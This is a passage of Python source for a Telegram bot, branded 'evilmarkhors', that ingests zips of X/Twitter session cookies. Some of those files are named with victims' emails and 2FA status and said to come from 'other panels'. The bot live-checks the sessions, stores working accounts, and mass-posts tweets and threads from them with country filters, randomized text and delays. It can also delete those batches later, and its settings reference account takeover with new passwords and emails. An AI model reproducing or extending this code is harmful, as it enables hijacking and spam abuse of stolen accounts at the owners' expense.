            for k in cfg["auto"]:
                cfg["auto"][k] = v
        elif r in cfg["auto"]:
            cfg["auto"][r] = not cfg["auto"][r]
        else:
            await u.message.reply_text("PK | IN | OTHER | ALL")
            return
        save_camp(uid)
        await u.message.reply_text("auto " + json.dumps(cfg["auto"]))
    elif sub == "media":
        cfg["stage"] = "media"
        save_camp(uid)
        await u.message.reply_text("Photo/video bhejo.")
    elif sub == "mediaclear":
        for m in cfg["media"]:
            try:
                os.remove(m["path"])
            except Exception:
                pass
        cfg["media"] = []
        save_camp(uid)
        await u.message.reply_text("Media clear.")
    elif sub == "tag":
        t = " ".join(c.args[1:]).strip()
        if not t:
            await u.message.reply_text("Tag do: /camp tag #Hash")
            return
        cfg["tag"] = t if t.startswith("#") else "#" + t.lstrip("#")
        save_camp(uid)
        await u.message.reply_text("Tag = " + cfg["tag"])
    elif sub == "source":
        s = a[1] if len(a) > 1 else ""
        if s not in ("zip", "db"):
            await u.message.reply_text("zip | db")
            return
        cfg["source"] = s
        save_camp(uid)
        await u.message.reply_text("Source = " + s)
    elif sub == "nopost":
        try:
            cfg["nopost"] = max(int(c.args[1]), 0)
        except Exception:
            await u.message.reply_text("/camp nopost 7")
            return
        save_camp(uid)
        await u.message.reply_text("nopost = " + str(cfg["nopost"]) + "d")
    elif sub == "filter":
        f = cfg["filter"]
        k = a[1] if len(a) > 1 else ""
        if k == "clear":
            cfg["filter"] = {"countries": [], "years": [], "min_followers": 0,
                             "skip_protected": False}
            save_camp(uid)
            await u.message.reply_text("Filter clear. Ab sab countries/years.")
            return
        if len(a) < 3:
            await u.message.reply_text("country | year | followers | protected | clear")
            return
        if k == "country":
            f["countries"] = [to_iso(x) or x.upper()
                              for x in " ".join(c.args[2:]).split(",") if x.strip()]
        elif k == "year":
            f["years"] = parse_years(" ".join(c.args[2:]))
        elif k == "followers":
            try:
                f["min_followers"] = max(int(c.args[2].replace(",", "").strip()), 0)
            except Exception:
                await u.message.reply_text("/camp filter followers 500")
                return
        elif k == "protected":
            f["skip_protected"] = a[2] in ("on", "1", "yes")
        else:
            await u.message.reply_text("country | year | followers | protected | clear")
            return
        save_camp(uid)
        await u.message.reply_text("Filter: " + json.dumps(cfg["filter"]))
    elif sub == "limit":
        try:
            cfg["limit"] = max(int(c.args[1]), 0)
        except Exception:
            await u.message.reply_text("Number do.")
            return
        save_camp(uid)
        await u.message.reply_text("Limit = " + ("ALL" if not cfg["limit"] else str(cfg["limit"])))
    elif sub == "delay":
        try:
            lo, hi = c.args[1].split("-")
            cfg["delay"] = [float(lo), float(hi)]
        except Exception:
            await u.message.reply_text("/camp delay 45-110")
            return
        save_camp(uid)
        await u.message.reply_text("Delay = " + c.args[1])
    elif sub == "parts":
        try:
            cfg["max_parts"] = max(min(int(c.args[1]), 6), 1)
        except Exception:
            await u.message.reply_text("1-6")
            return
        save_camp(uid)
        await u.message.reply_text("Parts = " + str(cfg["max_parts"]))
    elif sub == "cleanup":
        cfg["cleanup_partial"] = (a[1] in ("on", "1", "yes")) if len(a) > 1 else not cfg["cleanup_partial"]
        save_camp(uid)
        await u.message.reply_text("cleanup = " + str(cfg["cleanup_partial"]))
    elif sub == "dry":
        cfg["dry_run"] = not cfg["dry_run"]
        save_camp(uid)
        await u.message.reply_text("dry = " + str(cfg["dry_run"]))
    elif sub == "preview":
        out = []
        for r in ("PK", "IN", "OTHER"):
            out.append("== " + r + " ==")
            for _ in range(2):
                out.extend(compose(cfg, r))
                out.append("")
        txt = "\n".join(out)
        for i in range(0, len(txt), 3800):
            await u.message.reply_text(txt[i:i + 3800])
    elif sub == "start":
        if uid in CAMPRUN or job_running(uid):
            await u.message.reply_text("Pehle wala kaam chal raha hai. /stopcamp ya /cancel.")
            return
        if cfg["source"] == "db":
            if not db_enabled():
                await u.message.reply_text("DB off. /camp source zip")
                return
            task = start_job(uid, "camp", lambda: run_campaign_db(u, uid))
            if task is None:
                await u.message.reply_text("Koi kaam pehle se chal raha hai.")
                return
            await u.message.reply_text("DB campaign shuru...")
            return
        cfg["stage"] = "cookies"
        cfg["stage_at"] = time.time()
        save_camp(uid)
        await u.message.reply_text("Ab cookie zip bhejo.")
    elif sub == "resume_partial":
        bid = (a[1] if len(a) > 1 else "").strip()
        if not bid:
            await u.message.reply_text("Bid do: /camp resume_partial camp<id>")
            return
        await resume_partial_batch(u, bid)
    elif sub == "reset":
        for m in cfg.get("media", []):
            try:
                os.remove(m["path"])
            except Exception:
                pass
        CAMPS.pop(uid, None)
        try:
            os.remove(camp_file(uid))
        except Exception:
            pass
        await u.message.reply_text("Reset.")
    else:
        await u.message.reply_text("Subcommand samajh nahi aayi. /camp dekho.")


async def resume_partial_batch(u, bid):
    """Partial threads ke baaki parts post karo."""
    uid = str(u.effective_user.id)
    path = os.path.join(DEL_DIR, os.path.basename(uid + "_" + bid + ".json"))
    if not os.path.exists(path):
        await u.message.reply_text("Partial batch nahi mila: " + bid)
        return
    with open(path, encoding="utf-8") as f:
        items = json.load(f)
    partials = [it for it in items if it.get("partial")]
    if not partials:
        await u.message.reply_text("Koi partial thread nahi hai is batch mein.")
        return
    msg = await u.message.reply_text("Resuming " + str(len(partials)) + " partial threads...")
    cfg = CAMPS.get(uid)
    if not cfg:
        await u.message.reply_text("Pehle /camp new <name> karo.")
        return
    posted_count = 0
    fail_count = 0
    async with http_client() as client:
        for it in partials:
            ck_raw = it.get("cookies") or []
            if isinstance(ck_raw, dict):
                ck = ck_raw
            else:
                ck = cookie_dict(ck_raw)
            if not ck:
                fail_count += 1
                continue
            _ = it["username"]
            already_posted = it.get("ids") or []
            role = it.get("role", "OTHER")
            parts = compose(cfg, role)
            remaining = parts[len(already_posted):]
            if not remaining:
                posted_count += 1
                continue
            data = {"tweet_mode": "extended", "auto_populate_reply_metadata": "false"}
            if already_posted:
                data["in_reply_to_status_id"] = already_posted[-1]
            ok = True
            new_ids = list(already_posted)
            for i2, part in enumerate(remaining):
                if part.strip():
                    data["status"] = part
                else:
                    data["status"] = "."
                if new_ids:
                    data["in_reply_to_status_id"] = new_ids[-1]
                j, err = await _tweet_req(client, ck, data)
                if err:
                    ok = False
                    break
                tid = j.get("id_str") if isinstance(j, dict) else None
                if tid:
                    new_ids.append(tid)
                if i2 < len(remaining) - 1:
                    await asyncio.sleep(random.uniform(THREAD_GAP_MIN, THREAD_GAP_MAX))
            if ok:
                it["ids"] = new_ids
                posted_count += 1
            else:
                fail_count += 1
            await asyncio.sleep(random.uniform(POST_MIN, POST_MAX))
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(items, f)
    except Exception:
        logging.exception("resume_partial save")
    await _edit(msg, "Resume complete | posted " + str(posted_count) + " | fail " + str(fail_count))
    await u.message.reply_text("/delbatch " + bid + " se saare threads delete karein.")


async def stopcamp_cmd(u, c):
    uid = str(u.effective_user.id)
    state = CAMPRUN.get(uid)
    if state is not None:
        state["stop"] = True
    if job_running(uid) == "camp" or state is not None:
        await u.message.reply_text("Stop - current account ke baad rukega.")
    else:
        await u.message.reply_text("Koi campaign nahi.")


async def report_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    last = LAST_REPORT.get(uid)
    if not last:
        await u.message.reply_text("Abhi koi campaign report nahi. /camp start karo.")
        return
    await u.message.reply_text(last[:3900]
                               + "\n\n(detail report zip campaign khatam pe aati hai)")


async def tweet_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    old = TWEET.get(uid)
    if old and old.get("tmp"):
        shutil.rmtree(old["tmp"], ignore_errors=True)
    filt = [to_iso(a) or a.upper() for a in " ".join(c.args).split(",") if a.strip()]
    TWEET[uid] = {"stage": "content", "variants": [], "media": None, "filter": filt, "tmp": None}
    await u.message.reply_text("Compose. Texts bhejo. /tweetgo se aage."
                               + (" Filter: " + ", ".join(filt) if filt else ""))


async def tweetgo_cmd(u, c):
    t = TWEET.get(str(u.effective_user.id))
    if not t:
        await u.message.reply_text("Pehle /tweet.")
        return
    if not t["variants"] and not t["media"]:
        await u.message.reply_text("Kuch bhejo pehle.")
        return
    t["stage"] = "cookies"
    await u.message.reply_text("Ab cookie zip bhejo.")


async def tweetcancel_cmd(u, c):
    t = TWEET.pop(str(u.effective_user.id), None)
    if t and t.get("tmp"):
        shutil.rmtree(t["tmp"], ignore_errors=True)
    await u.message.reply_text("Cancel.")


async def run_tweet_batch(u, doc):
    uid = str(u.effective_user.id)
    t = TWEET.get(uid)
    if not t:
        await u.message.reply_text("Tweet session band ho gaya, /tweet dobara.")
        return
    tmp = tempfile.mkdtemp(prefix="tw_")
    ip = os.path.join(tmp, "in.zip")
    msg = await u.message.reply_text("Download...")
    links, failed, saved = [], [], []
    batch_id = str(int(time.time()))
    try:
        f = await doc.get_file()
        await f.download_to_drive(ip)
        with zipfile.ZipFile(ip) as zin:
            names = zip_txt_names(zin)
            prog = Progress(msg, len(names), "TWEET")
            prog.phase = "Posting"
            filt, variants = t.get("filter") or [], t.get("variants") or [""]

            sem = asyncio.Semaphore(max(CONCURRENCY, 1))

            async def one(name):
                async with sem:
                    try:
                        raw = zip_read_text(zin, name)
                        data, cookies = parse_cookie_file(raw)
                        ck = cookie_dict(cookies)
                        if not ck:
                            failed.append(name + " | no cookies")
                            prog.fail += 1
                            return
                        if filt:
                            iso = to_iso(await asyncio.wait_for(detect_country(client, ck),
                                                               ACC_TIMEOUT))
                            if iso not in filt:
                                return
                        ids, terr = await post_tweet(client, ck,
                                                     randomize(random.choice(variants)),
                                                     t.get("media"))
                        uname = data.get("Username", "") or name
                        if not terr and ids:
                            links.append(uname + " | https://x.com/" + uname + "/status/"
                                         + ids[0])
                            saved.append({"username": uname, "ids": ids,
                                          "cookies": cookies})
                            prog.ok += 1
                        elif ids:
                            # Thread beech me fail hua: jo parts post hue wo save karo,
                            # warna /delbatch se delete hi nahi ho payenge.
                            saved.append({"username": uname, "ids": ids,
                                          "cookies": cookies})
                            failed.append(uname + " | " + (terr or "fail")
                                          + " (partial)")
                            prog.fail += 1
                        else:
                            failed.append(uname + " | " + (terr or "fail"))
                            prog.fail += 1
                    except asyncio.CancelledError:
                        raise
                    except Exception as e:
                        logging.exception("tweet %s", name)
                        failed.append(name + " | " + str(e))
                        prog.fail += 1

            async with http_client() as client:
                await pmap_progress(prog, one, names, CONCURRENCY)
                await prog.update(force=True)
        if saved:
            os.makedirs(DEL_DIR, exist_ok=True)
            with open(os.path.join(DEL_DIR, uid + "_" + batch_id + ".json"), "w", encoding="utf-8") as f:
                json.dump(saved, f)
        op = os.path.join(tmp, "out.zip")
        with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("links.txt", "\n".join(links))
            z.writestr("failed.txt", "\n".join(failed))
            z.writestr("summary.txt", "posted " + str(len(links)) + " | fail " + str(len(failed))
                       + "\nbatch " + batch_id)
        await _send_zip(u, op, "evilmarkhors_tweet.zip",
                        "Done | posted " + str(len(links)) + " | fail " + str(len(failed))
                        + "\n/delbatch " + batch_id)
        if links:
            chunk = ""
            for line in links:
                if len(chunk) + len(line) > 3500:
                    await u.message.reply_text(chunk)
                    chunk = ""
                chunk += line + "\n"
            if chunk:
                await u.message.reply_text(chunk)
        await _edit(msg, "Complete")
    except Exception as e:
        logging.exception("tweet batch")
        await _edit(msg, "Error: " + str(e))
    finally:
        # Sirf apni session pop karo - beech mein /tweet se nayi session
        # ban sakti hai, usko delete nahi karna.
        if TWEET.get(uid) is t:
            TWEET.pop(uid, None)
        if t and t.get("tmp"):
            shutil.rmtree(t["tmp"], ignore_errors=True)
        shutil.rmtree(tmp, ignore_errors=True)


async def del_batch(uid, u, bid):
    path = os.path.join(DEL_DIR, os.path.basename(uid + "_" + bid + ".json"))
    if not os.path.exists(path):
        await u.message.reply_text("Batch nahi mila: " + bid)
        return
    with open(path, encoding="utf-8") as f:
        items = json.load(f)
    if not items:
        os.remove(path)
        await u.message.reply_text("Khali batch hata di.")
        return
    msg = await u.message.reply_text("Deleting " + str(len(items)) + "...")
    deleted = fail = 0
    async with http_client() as client:
        for it in items:
            ck_raw = it.get("cookies") or []
            if isinstance(ck_raw, dict):
                ck = ck_raw
            else:
                ck = cookie_dict(ck_raw)
            if not ck:
                fail += 1
                continue
            n = await delete_ids(client, ck, it.get("ids") or [])
            deleted += n
            if n == 0:
                fail += 1
            await asyncio.sleep(2)
    await _edit(msg, "Deleted " + str(deleted) + " | fail " + str(fail))
    if fail == 0:
        try:
            os.remove(path)
            await u.message.reply_text("Sab delete ho gaya, batch file hata di.")
        except Exception:
            logging.exception("del_batch remove")


async def delbatches_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    if not os.path.isdir(DEL_DIR):
        await u.message.reply_text("Koi batch nahi.")
        return
    rows = []
    for fn in sorted(os.listdir(DEL_DIR)):
        if fn.startswith(uid + "_") and fn.endswith(".json"):
            bid = fn[len(uid) + 1:-5]
            try:
                with open(os.path.join(DEL_DIR, fn), encoding="utf-8") as f:
                    n = len(json.load(f))
            except Exception:
                n = 0
            rows.append(bid + " -> " + str(n))
    if not rows:
        await u.message.reply_text("Koi saved batch nahi.")
        return
    extra = ""
    if len(rows) > 50:
        extra = "\n... +" + str(len(rows) - 50) + " purane"
        rows = rows[-50:]
    await u.message.reply_text("Batches:\n" + "\n".join(rows) + extra
                               + "\n\n/delbatch <id>")


async def delbatch_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    if not c.args:
        await u.message.reply_text("Batch id do.")
        return
    await del_batch(uid, u, c.args[0].strip())


async def broadcast_cmd(u, c):
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    text = " ".join(c.args)
    if not text:
        await u.message.reply_text("Text do.")
        return
    sent = fail = 0
    bot = u.get_bot()
    for uid in list(_store.keys()):
        try:
            await bot.send_message(int(uid), text)
            sent += 1
        except RetryAfter as e:
            wait = getattr(e, "retry_after", 5)
            await asyncio.sleep(min(wait, 60))
            try:
                await bot.send_message(int(uid), text)
                sent += 1
            except Exception:
                fail += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await u.message.reply_text("Sent " + str(sent) + " | fail " + str(fail))


async def countrytest_cmd(u, c):
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    CTEST[str(u.effective_user.id)] = time.time()
    await u.message.reply_text("Ek cookie .txt bhejo.")


async def country_test(u, doc):
    tmp = tempfile.mkdtemp(prefix="ct_")
    p = os.path.join(tmp, "c.txt")
    try:
        f = await doc.get_file()
        await f.download_to_drive(p)
        with open(p, encoding="utf-8", errors="ignore") as fh:
            data, cookies = parse_cookie_file(fh.read())
        if not cookies:
            await u.message.reply_text("Cookie lines nahi mili.")
            return
        async with http_client() as client:
            ld = await live_check(client, cookie_dict(cookies))
        txt = ("Status: " + str(ld.get("Status") or "UNKNOWN")
               + "\nCountry: " + str(ld.get("Country") or "(nahi mila)")
               + "\nuser: " + str(ld.get("Username") or data.get("Username", "")))
        if ld.get("Reason"):
            txt += "\nreason: " + str(ld.get("Reason"))
        await u.message.reply_text(txt)
    except Exception as e:
        await u.message.reply_text("Error: " + str(e))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


async def on_media(u, c):
    uid = str(u.effective_user.id)
    msg = u.message
    tgf = kind = mime = None
    if msg.photo:
        tgf, kind, mime = msg.photo[-1], "image", "image/jpeg"
    elif msg.video:
        tgf, kind, mime = msg.video, "video", (msg.video.mime_type or "video/mp4")
    elif msg.animation:
        tgf, kind, mime = msg.animation, "gif", (msg.animation.mime_type or "video/mp4")
    elif msg.document:
        mt = msg.document.mime_type or ""
        if mt == "image/gif":
            tgf, kind, mime = msg.document, "gif", mt
        elif mt.startswith("image/"):
            tgf, kind, mime = msg.document, "image", mt
        elif mt.startswith("video/"):
            tgf, kind, mime = msg.document, "video", mt
    if not tgf:
        return
    cfg = CAMPS.get(uid)
    if cfg and cfg.get("stage") == "media":
        cat = ("tweet_image" if kind == "image"
               else "tweet_gif" if kind == "gif" else "tweet_video")
        ext = {"image/jpeg": ".jpg", "image/png": ".png", "image/gif": ".gif",
               "video/mp4": ".mp4", "video/webm": ".webm", "video/quicktime": ".mov"}.get(mime, "")
        # ts+counter se collision na ho; extension rakho taake Telegram
        # file type pehchaan sake.
        path = os.path.join(camp_media_dir(uid),
                            str(int(time.time() * 1000)) + "_" + str(random.randint(1000, 9999)) + "_" + kind + ext)
        try:
            f = await tgf.get_file()
            await f.download_to_drive(path)
            cfg["media"].append({"path": path, "mime": mime, "category": cat})
            save_camp(uid)
            await u.message.reply_text(kind + " add (" + str(len(cfg["media"])) + ").")
        except Exception as e:
            await u.message.reply_text("Media error: " + str(e))
        return
    t = TWEET.get(uid)
    if not t or t["stage"] != "content":
        return
    if t.get("tmp"):
        shutil.rmtree(t["tmp"], ignore_errors=True)
        # Purani media ka path bhi clear karo, warna upload fail hota rahega.
        t["tmp"] = None
        t["media"] = None
    tmp = tempfile.mkdtemp(prefix="twm_")
    ext = {"image/jpeg": ".jpg", "image/png": ".png", "image/gif": ".gif",
           "video/mp4": ".mp4", "video/webm": ".webm", "video/quicktime": ".mov"}.get(mime, "")
    path = os.path.join(tmp, "media" + ext)
    try:
        f = await tgf.get_file()
        await f.download_to_drive(path)
        TWEET[uid]["media"] = {"path": path, "mime": mime,
                               "category": ("tweet_image" if kind == "image"
                                            else "tweet_gif" if kind == "gif"
                                            else "tweet_video")}
        TWEET[uid]["tmp"] = tmp
        if msg.caption:
            TWEET[uid]["variants"].append(msg.caption)
        await u.message.reply_text(kind + " set. Aur bhejo ya /tweetgo.")
    except Exception as e:
        await u.message.reply_text("Media error: " + str(e))


def _looks_like_cookie(text):
    n = sum(1 for l in (text or "").splitlines()
            if l.startswith("#HttpOnly_") or len(l.split("\t")) >= 7)
    if n <= 0:
        return False
    return ("auth_token" in text) or ("ct0" in text) or n >= 3


def detect_mode(text, forced):
    if forced in ("cookies", "ulp", "verify"):
        return forced
    return "cookies" if _looks_like_cookie(text) else "ulp"


# ============================ ALT COOKIE FORMAT REWORK ============================
# Alternative cookie formats (from other panels/tools):
#   [plus] [2fa false] [advparasverma007@gmail.com].txt
#   [free] [2fa true] [tuchtfeld.nico@gmail.com].txt
#   [go] [2fa false] [1vemula.shyam@gmail.com].txt
#   [Free] [sm6327279@gmail.com].txt
#   free data @masonebrute .txt
#
# These files contain X/Twitter cookies (auth_token, ct0, etc.) in tab-separated
# Netscape format or plain key=value lines. This module parses them, extracts
# metadata from the filename, and rebrands with the bot's standard format.

import re as _re


def parse_alt_cookie_filename(filename):
    """Extract metadata from alternative cookie filename.

    Returns dict with keys: type, two_fa, email, raw.
    """
    name = (filename or "").strip()
    if name.lower().endswith(".txt"):
        name = name[:-4]
    result = {"type": "", "two_fa": "", "email": "", "raw": name}

    # Pattern: [type] [2fa true/false] [email]
    m = _re.match(
        r"^\[([^\]]+)\]\s*\[2fa\s*(true|false)?\]\s*\[([^\]]+)\]",
        name, _re.I)
    if m:
        result["type"] = m.group(1).strip()
        result["two_fa"] = (m.group(2) or "").lower()
        result["email"] = m.group(3).strip()
        return result

    # Pattern: [type] [email]  (no 2fa field)
    m = _re.match(r"^\[([^\]]+)\]\s*\[([^\]]+)\]", name)
    if m:
        result["type"] = m.group(1).strip()
        result["email"] = m.group(2).strip()
        return result

    # Pattern: free data @email
    m = _re.match(r"^(free|paid|premium|plus|go)\s+data\s+@([^\s]+)", name, _re.I)
    if m:
        result["type"] = m.group(1).strip()
        result["email"] = m.group(2).strip()
        return result

    # Pattern: [email] only
    m = _re.match(r"^\[([^\]]+)\]", name)
    if m:
        result["email"] = m.group(1).strip()
        return result

    return result


def parse_alt_cookie_content(text):
    """Parse cookie content from alternative format text.

    Supports:
      - Netscape tab-separated lines (#HttpOnly_ prefix optional)
      - key=value lines
      - key: value format

    Returns list of cookie strings in Netscape format.
    """
    cookies = []
    seen = set()
    exp = int(time.time()) + 86400 * 30

    for line in (text or "").splitlines():
        line = line.rstrip("\r")
        if not line.strip() or line.strip().startswith("#"):
            continue

        # Netscape tab-separated: domain	flag	path	secure	expire	name	value
        if "	" in line and len(line.split("	")) >= 7:
            parts = line.split("	")
            name = parts[5].strip()
            val = parts[6].strip()
            if name and val and name not in seen:
                seen.add(name)
                cookies.append(_cookie_line(
                    ".x.com	TRUE	/	TRUE	" + str(exp) + "	" + name + "	" + val))
            continue

        # key=value or key: value
        for sep in ("=", ":"):
            if sep in line:
                k, v = line.split(sep, 1)
                k = k.strip()
                v = v.strip().strip('"').strip("'")
                if k and v and k not in seen:
                    seen.add(k)
                    cookies.append(_cookie_line(
                        ".x.com	TRUE	/	TRUE	" + str(exp) + "	" + k + "	" + v))
                break

    return cookies


def rework_alt_cookie(filename, text):
    """Rebrand an alternative format cookie file with bot branding.

    Returns (output_text, meta_dict).
    """
    meta = parse_alt_cookie_filename(filename)
    cookies = parse_alt_cookie_content(text)

    data = {}
    if meta["type"]:
        data["Type"] = meta["type"]
    if meta["two_fa"]:
        data["2FA"] = meta["two_fa"]
    if meta["email"]:
        data["Email"] = meta["email"]
    data["Status"] = "UNKNOWN"
    data["Reason"] = "alt format reworked - not live checked"

    output = build_cookie_file(data, cookies)
    return output, meta


async def _hard_clear(uid, keep_tmp=False):
    for v in PEND.get(uid, {}).values():
        try:
            await v["client"].aclose()
        except Exception:
            pass
    PEND.pop(uid, None)
    BATCH_SAVE.pop(uid, None)
    b = BATCH.pop(uid, None)
    if b and not keep_tmp:
        shutil.rmtree(b["tmp"], ignore_errors=True)
    clear_batch_file(uid)


def _store_kb():
    row = [InlineKeyboardButton("Sirf file", callback_data="store:file")]
    if db_enabled():
        row.append(InlineKeyboardButton("File + DB", callback_data="store:both"))
        row.append(InlineKeyboardButton("Sirf DB", callback_data="store:db"))
    return InlineKeyboardMarkup(
        [row, [InlineKeyboardButton("Cancel", callback_data="store:no")]])


async def ask_store(msg, st):
    st["msg"] = msg
    st["at"] = time.time()
    await msg.edit_text(
        "File mili: " + str(st["count"]) + " account(s)\n\n"
        "Sirf check karke file wapas, ya working accounts DB mein bhi add karne hain?",
        reply_markup=_store_kb())


async def on_store_cb(u, c):
    q = u.callback_query
    await q.answer()
    uid = str(u.effective_user.id)
    st = STORE_ASK.pop(uid, None)
    if not st:
        await q.edit_message_text("Expire ho gayi, file dobara bhejo.")
        return
    if time.time() - st.get("at", 0) > JOB_REAP_MIN * 60:
        shutil.rmtree(st.get("tmp", ""), ignore_errors=True)
        await q.edit_message_text("Expire ho gayi, file dobara bhejo.")
        return
    choice = (q.data or "").split(":", 1)[-1]
    if choice not in ("file", "both", "db", "no"):
        shutil.rmtree(st.get("tmp", ""), ignore_errors=True)
        await q.edit_message_text("Ghalat choice, cancel kar diya.")
        return
    if choice == "no":
        shutil.rmtree(st["tmp"], ignore_errors=True)
        await q.edit_message_text("Cancel.")
        return
    if choice in ("db", "both") and not db_enabled():
        choice = "file"
        await q.edit_message_text("DB off hai, sirf file bana raha hoon...")
    else:
        await q.edit_message_text("Choice: " + choice + "\nChal raha hoon...")
    if st.get("verify"):
        factory = lambda: verify_with_store(u, uid, st, choice)
    else:
        factory = lambda: process_with_store(u, uid, st, choice)
    task = start_job(uid, "file", factory)
    if task is None:
        STORE_ASK[uid] = st
        # Buttons wapas dikhao, warna user ke paas dobara click karne ka
        # koi tarika nahi bachta.
        await ask_store(q.message, st)


async def verify_with_store(u, uid, st, choice):
    tmp, ip = st["tmp"], st.get("ip", "")
    if not os.path.exists(ip):
        await _ctx_say(u, "File temp se gayi, dobara bhejo.")
        shutil.rmtree(tmp, ignore_errors=True)
        await _hard_clear(uid)
        return
    want_db = choice in ("db", "both") and db_enabled()
    want_file = choice in ("file", "both") or not want_db
    msg = st.get("msg")
    sink = [] if want_db else None
    op = os.path.join(tmp, "out.zip")
    try:
        ok, why = await x_route_check()
        if not ok:
            await _ctx_say(u, route_fail_text(why))
            return
        prog = Progress(msg, 0, "VERIFY")
        prog.phase = "Checking"
        if st.get("is_zip"):
            await process_verify(ip, op, True, prog, sink, uid)
        else:
            await process_verify_single(ip, op, True, prog, sink, uid)
        cap = ("Verify | live " + str(prog.live) + " | dead " + str(prog.fail))
        if prog.unk:
            cap += " | unknown " + str(prog.unk)
        if prog.notes:
            cap += "\nWajah: " + prog.notes_text(3)
        cap += prog.all_unknown_hint()
        if want_db:
            if sink:
                async with http_client(use_proxy=False) as client:
                    n, e = await db_upsert(client, sink)
                cap += "\nDB added: " + str(n) + (" (" + e + ")" if e else "")
            else:
                cap += "\nDB added: 0 (koi live nahi)"
        if want_file:
            await _send_zip(u, op, "evilmarkhors_verify.zip", cap)
        else:
            await _ctx_say(u, "Done\n" + cap)
        await _edit(msg, "Complete")
    except Exception as e:
        logging.exception("verify_with_store")
        await _edit(msg, "Error: " + str(e))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
        await _hard_clear(uid)


async def process_with_store(u, uid, st, choice):
    tmp, ip, is_zip, live = st["tmp"], st["ip"], st["is_zip"], st["live"]
    if not os.path.exists(ip):
        await _ctx_say(u, "File temp se gayi, dobara bhejo.")
        shutil.rmtree(tmp, ignore_errors=True)
        return
    msg = st.get("msg")
    sink = []
    op = os.path.join(tmp, "out.zip")
    want_db = choice in ("db", "both") and db_enabled()
    want_file = choice in ("file", "both")
    if not want_db and not want_file:
        want_file = True
    try:
        if live:
            ok, why = await x_route_check()
            if not ok:
                await _ctx_say(u, route_fail_text(why))
                return
        prog = Progress(msg, 1, "COOKIES")
        prog.phase = "Rework + verify"
        if is_zip:
            await process_cookie_zip(ip, op, live, prog, sink if want_db else None, uid)
        else:
            with open(ip, encoding="utf-8", errors="ignore") as fh:
                text = fh.read()
            async with http_client() as client:
                out, data, cookies = await rework_cookie(text, client, live)
            if data.get("Status") == "LIVE":
                prog.ok = prog.live = 1
                if want_db and cookies:
                    row = db_row_from(data, cookie_dict(cookies), uid)
                    if row:
                        sink.append(row)
            elif data.get("Status") == "UNKNOWN":
                prog.unk = 1
                prog.add_note("unknown: " + str(data.get("Reason") or "?"))
            else:
                prog.fail = 1
                prog.add_note("dead: " + str(data.get("Reason") or "?"))
            with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
                z.writestr("reworked.txt", out)
            prog.done = 1
            await prog.update(force=True)
        db_ok, db_err = 0, None
        if want_db and sink:
            async with http_client(use_proxy=False) as client:
                db_ok, db_err = await db_upsert(client, sink)
        cap = ("ok " + str(prog.ok) + " | live " + str(prog.live)
               + " | fail " + str(prog.fail))
        if prog.unk:
            cap += " | unknown " + str(prog.unk)
        if prog.notes:
            cap += "\nWajah: " + prog.notes_text(3)
        cap += prog.all_unknown_hint()
        if want_db:
            cap += "\nDB added: " + str(db_ok) + (" (" + db_err + ")" if db_err else "")
            if not live:
                cap += "\nDB ke liye /live on karke dobara bhejo."
        if want_file:
            await _send_zip(u, op, "evilmarkhors_cookies.zip", cap)
        else:
            await _ctx_say(u, "Done\n" + cap)
        await _edit(msg, "Complete")
    except Exception as e:
        logging.exception("process_with_store")
        await _edit(msg, "Error: " + str(e))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


async def handle_file(u, c, doc):
    uid = str(u.effective_user.id)
    g = ucfg(uid)
    msg = await u.message.reply_text("File mili - shuru...")
    try:
        cur = JOBS.get(uid)
        if cur and cur["task"] is not asyncio.current_task() and not cur["task"].done():
            await _edit(msg, "Pehle wala kaam (" + cur["kind"] + ") chal raha hai. /cancel.")
            return

        old = STORE_ASK.pop(uid, None)
        if old:
            shutil.rmtree(old.get("tmp", ""), ignore_errors=True)

        if uid in BATCH:
            if PEND.get(uid):
                await _edit(msg, "Pehla batch code ka intezar kar raha hai. /finalize ya /cancel.")
                return
            await _hard_clear(uid)
        name = (doc.file_name or "").lower()
        is_zip = name.endswith(".zip")
        tmp = tempfile.mkdtemp(prefix="em_")
        ip = os.path.join(tmp, "in" + (".zip" if is_zip else ".txt"))
        BATCH[uid] = {"tmp": tmp, "msg": msg, "mode": "?", "takeover": g["takeover"],
                      "newpass": g["newpass"], "newemail": g["newemail"],
                      "results": [], "lines": [], "ok": 0, "fail": 0, "started": time.time()}
        for attempt in range(3):
            try:
                await _edit(msg, "Download... try " + str(attempt + 1))
                f = await doc.get_file()
                await f.download_to_drive(ip)
                break
            except Exception:
                if attempt == 2:
                    raise
                await asyncio.sleep(2)
        if is_zip:
            with zipfile.ZipFile(ip) as z:
                names = zip_txt_names(z)
                sample, cnt = "", len(names)
                for n in names[:3]:
                    sample += zip_read_text(z, n)
        else:
            with open(ip, encoding="utf-8", errors="ignore") as fh:
                sample = fh.read()
            cnt = 1
        mode = detect_mode(sample, g["mode"])
        BATCH[uid]["mode"] = mode
        if mode in ("cookies", "verify"):
            smode = get_store_mode(uid)
            if mode == "verify":
                if smode == "ask" and db_enabled():
                    st = {"tmp": tmp, "ip": ip, "is_zip": is_zip, "live": True,
                          "count": cnt, "verify": True, "at": time.time()}
                    STORE_ASK[uid] = st
                    await _hard_clear(uid, keep_tmp=True)
                    await ask_store(msg, st)
                    return
                op = os.path.join(tmp, "out.zip")
                ok, why = await x_route_check()
                if not ok:
                    await _edit(msg, route_fail_text(why))
                    await _hard_clear(uid)
                    return
                prog = Progress(msg, 0, "VERIFY")
                prog.phase = "Checking"
                sink = [] if smode in ("db", "both") and db_enabled() else None
                if is_zip:
                    await process_verify(ip, op, True, prog, sink, uid)
                else:
                    await process_verify_single(ip, op, True, prog, sink, uid)
                cap = "Verify | live " + str(prog.live) + " | dead " + str(prog.fail)
